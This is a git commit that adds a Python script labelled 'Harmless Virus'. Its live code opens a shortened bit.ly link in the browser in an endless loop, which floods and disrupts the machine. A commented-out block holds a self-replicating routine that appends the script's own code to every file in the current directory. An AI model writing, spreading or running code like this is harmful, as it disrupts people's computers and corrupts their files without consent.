e6dfcfddfbbf03d2d5b90efddfffa9f6678cf6da
dasurfingninja <62672004+dasurfingninja@users.noreply.github.com>
2020-03-26 21:14:27 -0700

    Harmless Virus
    (or at least its harmless if you use it correctly)

---
+++ non shortcut of virus (not as good)/Virus.py
@@ -0,0 +1,15 @@
+import os
+import webbrowser
+
+# virus_file = open("virus.py", "r")
+# virus_code = virus_file.read()
+# virus_file.close()
+# for file_name in os.listdir():
+#     if os.path.isfile(file_name):
+#         print("writing to file", file_name)
+#         file = open(file_name, "a")
+#         file.write(virus_code)
+#         file.close()
+
+while True:
+    webbrowser.open("https://bit.ly/whahahaha")
